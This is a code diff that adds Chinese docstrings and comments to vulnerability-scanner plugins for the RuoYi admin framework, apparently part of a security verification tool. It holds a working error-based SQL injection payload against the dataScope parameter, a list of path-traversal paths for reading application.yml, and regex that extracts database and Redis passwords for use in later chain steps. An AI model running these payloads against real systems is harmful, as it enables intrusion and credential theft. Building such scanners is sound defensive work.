@@ -28,9 +28,19 @@ class SQLInjectExtractPlugin(PluginBase):
     fix = "对 dataScope 参数做白名单校验，使用参数化查询"
 
     def verify(self, target, session):
+        """对 dataScope 参数发 extractvalue 报错注入，回显提取当前数据库名
+
+        命中 XPATH 报错特征（~库名 分隔）即判 CONFIRMED，库名存入 extra.db_name
+        供下游 ConfigReadPlugin 使用；网络异常返回 UNKNOWN。
+
+        @param target: 扫描目标 URL
+        @param session: HTTP 会话（含登录态与 cookie 处理）
+        @return: ScanResult；CONFIRMED=注入成功，SAFE=未命中特征，UNKNOWN=网络异常
+        """
         url = join_url(target, "/system/role/list")
         # 报错注入 payload：extractvalue 提取 database()
         params = {
+            # 0x7e 即 ASCII '~'：用作报错回显分隔符，配合下方正则稳定截取库名
             "dataScope": "1 AND extractvalue(1, concat(0x7e, (SELECT database())))",
             "pageNum": "1",
             "pageSize": "10",
@@ -85,8 +95,18 @@ class ConfigReadPlugin(PluginBase):
     fix = "限制文件读取接口路径，禁止目录穿越，配置文件敏感信息加密存储"
 
     def verify(self, target, session):
+        """通过任意文件读取接口下载 application.yml，提取 db/redis 密码
+
+        逐个尝试穿越路径，响应含 password/spring 关键字才视为配置文件；
+        提取的密码存入 extra 供链 1 后续节点使用，读取到文件即 CONFIRMED。
+
+        @param target: 扫描目标 URL
+        @param session: HTTP 会话（含登录态与 cookie 处理）
+        @return: ScanResult；CONFIRMED=读取到配置，SAFE=全部路径未命中，UNKNOWN=网络异常
+        """
         # 读取 Ruoyi 配置文件（常见路径）
         config_paths = [
+            # 多个路径对应不同部署层级（jar 解包/安装目录深度不同），依次尝试补足穿越层数
             "/profile/../../../../../../../ruoyi-admin/src/main/resources/application.yml",
             "/profile/../../../../../../../config/application.yml",
             "/profile/../../../../../../../application.yml",
@@ -111,6 +131,7 @@ class ConfigReadPlugin(PluginBase):
 
             # 正则提取 Redis 密码
             redis_password = ""
+            # 非贪婪+跨行匹配限定在 redis: 块内取密码，避免误匹配数据库密码
             redis_match = re.search(r"redis:.*?password:\s*(\S+)", text, re.DOTALL)
             if redis_match:
                 redis_password = redis_match.group(1)
@@ -160,6 +181,15 @@ class JobRCEVerifyPlugin(PluginBase):
     fix = "定时任务接口强制鉴权，禁止调用任意类方法，白名单限制可执行类"
 
     def verify(self, target, session):
+        """验证定时任务接口未授权访问与 RCE 风险（仅探测，不实际执行命令）
+
+        rows 含 jobId/invokeTarget 字段判定未授权（invokeTarget 存在时任 RCE 风险）；
+        跳转登录页或 401/403 判定已鉴权（SAFE）。
+
+        @param target: 扫描目标 URL
+        @param session: HTTP 会话（含登录态与 cookie 处理）
+        @return: ScanResult；CONFIRMED=未授权访问，SAFE=需鉴权或不可达，UNKNOWN=网络异常
+        """
         # 检查 /monitor/job 接口是否可访问（未授权）
         url = join_url(target, "/monitor/job/list")
         try:
